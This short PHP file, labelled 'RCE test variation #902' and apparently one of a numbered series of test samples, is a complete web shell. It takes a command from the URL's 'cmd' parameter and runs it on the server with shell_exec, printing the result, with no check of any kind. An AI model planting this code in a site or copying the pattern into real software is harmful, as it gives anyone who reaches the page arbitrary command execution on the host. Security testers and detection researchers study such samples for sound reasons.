<?php
// RCE test variation #902
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>